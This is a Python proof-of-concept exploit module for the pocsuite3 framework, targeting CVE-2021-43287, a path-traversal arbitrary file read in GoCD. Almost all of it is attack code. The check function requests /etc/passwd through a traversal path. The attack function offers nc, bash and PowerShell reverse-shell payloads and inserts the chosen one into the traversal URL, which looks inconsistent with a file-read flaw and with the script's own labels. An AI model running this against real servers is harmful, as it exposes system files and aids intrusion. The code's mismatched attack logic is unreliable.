# !/usr/bin/env python
# -*- coding: UTF-8 -*-
import json
from collections import OrderedDict
from urllib.parse import urlparse, urljoin
import re
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.lib.core.interpreter_option import OptDict
from pocsuite3.modules.listener import REVERSE_PAYLOAD


class GoCD(POCBase):
    vulID = 'CVE-2021-43287'
    version = '1.0'
    author = ['Warin9_0']
    vulDate = '2022-04-14'
    createDate = '2022-04-14'
    updateDate = '2022-05-06'
    references = ['']
    name = 'GoCD任意文件读取'
    appPowerLink = 'https://gitee.com/mirrors/GoCD'
    appName = 'GoCD'
    appVersion = """GoCD_14.2.0"""
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''GoCD任意文件读取'''
    samples = ['']
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
            "powershell": REVERSE_PAYLOAD.POWERSHELL,
        }
        o["command"] = OptDict(selected="powershell", default=payload)
        return o

    def _check(self, url):
        self.timeout = 5
        path = "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd"
        url = url.strip("/")
        vul_url = urljoin(url, path)
       # v0=vul_url
        parse = urlparse(vul_url)
        headers = {
            "Host": "{}".format(parse.netloc)
            }
        try:
            r = requests.get(vul_url, headers=headers, timeout=self.timeout, verify=False,allow_redirects=False)
        except Exception:
            return False
        else:
            pattern = 'root.*'
            str_1 = re.findall(pattern, r.text)
            str_2 = list(str_1)[0]
            if str_2 in r.text:
                return url,headers,r.text
            else:
                return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Verification code'] = '\n' + p[2]
        else:
            return False
        return self.parse_output(result)

    def _attack(self):
        result = {}
        p = self._check(self.url)
        cmd = self.get_option("command")
        if p:
            try:
                payload = "/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../..{cmd}".format(
                    cmd=cmd)
                print(payload)
                vul_url = p[0] + payload
                headers = p[1]
                r = requests.get(url = vul_url,headers=headers)
            except Exception:
                return False
            else:
                print(r.text)
                if r.status_code == 200:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = vul_url
                    result['VerifyInfo']['Verification code'] = '\n' + r.text
                else:
                    return False
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('url is not vulnerable')
        return output


register_poc(GoCD)
